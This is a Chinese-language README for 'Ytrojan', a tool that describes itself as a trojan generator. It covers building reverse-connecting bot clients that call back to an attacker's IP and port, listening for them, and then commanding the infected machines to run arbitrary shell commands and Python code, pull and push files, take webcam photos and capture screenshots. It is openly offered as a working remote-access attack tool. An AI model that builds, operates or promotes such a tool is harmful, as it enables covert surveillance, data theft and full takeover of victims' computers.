# Ytrojan

Ytrojan 一个基于TCP协议C/S架构的木马生成工具
控制端作为服务端 被控端作为客户端

## 选择语言/Select Your Language

   [English](/README.md)|简体中文

## 如何使用Ytrojan

用Python 3.10或以上版本的解释器运行Main-Cmd.py

运行结果
```
 __   ___             _             
 \ \ / / |_ _ __ ___ (_) __ _ _ __  
  \ V /| __| '__/ _ \| |/ _` | '_ \ 
   | | | |_| | | (_) | | (_| | | | |
   |_|  \__|_|  \___// |\__,_|_| |_|
                   |__/                         
                                      
Ytrojan $>
```  

### 使用generate命令生成被控端  

```
函数原型:YtrojanAPI.Generate(BotSrc,ControlIp,ControlPort)
命令:generate [BotSrc] [ControlIp] [ControlPort]

1.[BotSrc] 被控端脚本的路径
  例如: D:\bot.py  /home/bot.py
2.[ControlIp]  控制端ip
3.[ControlPort] 控制端端口
```  

### 使用listen命令打开控制端端口 等待反向木马被控端的连接  

```
函数原型:YtrojanAPI.Listen(ControlPort)
命令:listen [ControlPort]

1. [ControlPort] 控制端端口
```  

### 如何操作目标  

```
使用botnet命令查看所有被控端
命令:botnet  
输出:
   0  |  posix ycy0311 x86_64 127.0.0.1

左边的数字是被控端编号
右边第1个是操作系统类型(posix=MacOS/Linux nt=Windows)
右边第2个是设备网络名称
右边第3个是CPU架构
右边第4个是被控端ip
```  

```
使用run命令在被控端执行命令
函数原型:YtrojanAPI.Run(BotSocket,Command)
命令:run [被控端编号] [命令]
[命令]
     1.shell [ShellCommand]
      例如(在编号为0的被控端执行shell命令)
         run 0 shell ls(在编号为0的被控端执行shell命令ls)
         run 0 shell pwd(在编号为0的被控端执行shell命令pwd)
     2.pycode [PythonCode]
      例如(在编号为0的被控端执行python代码)
         run 0 pycode import tkinter;w = tkinter.Tk();w.mainloop()
         run 0 pycode print("hack you computer")
     3.getfile [控制端储存路径] [被控端文件路径]
      例如(在编号为0的被控端下载文件)
         run 0 getfile D:\a.jpg /home/image.jpg (把被控端的/home/image.jpg下载至控制端D\a.jpg)
         run 0 getfile D:\movie.mp4 /home/a.mp4 (把被控端的/home/a.mp4下载至控制端D\movie.mp4)
     4.putfile [被控端储存路径] [控制端文件路径]
      例如(在编号为0的被控端上传文件)
         run 0 putfile /home/a.jpg D:\a.jpg (把控制端D:\a.jpg上传至被控端/home/a.jpg)
         run 0 putfile /home/a.py D:\a.py (把控制端D:\a.py上传至被控端/home/a.py)
     5.webcamsnap [控制端储存路径]
      例如(调用编号为0的被控端摄像头拍照)
         run 0 webcamsnap D:\webcamsnap.jpg (摄像头拍照被控端保存至控制端D:\webcamsnap.jpg)
     6.screenshot [控制端储存路径]
      例如(编号为0的被控端屏幕截图)
         run 0 screenshot D:\screenshot.jpg (摄像头拍照被控端保存至控制端D:\screenshot.jpg)
```
